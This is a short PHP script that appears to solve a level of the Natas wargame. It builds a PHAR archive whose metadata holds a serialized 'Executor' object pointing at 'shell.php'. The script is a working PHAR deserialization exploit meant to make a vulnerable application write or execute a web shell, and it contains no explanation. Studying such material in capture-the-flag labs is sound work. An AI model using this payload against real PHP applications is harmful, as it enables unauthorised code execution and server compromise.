<?php
class Executor{
    private $filename = "shell.php";
    private $signature = true;
    private $init = false;
}

$phar = new Phar('natas.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$object = new Executor();
$phar->setMetadata($object);

$phar->stopBuffering();
?>
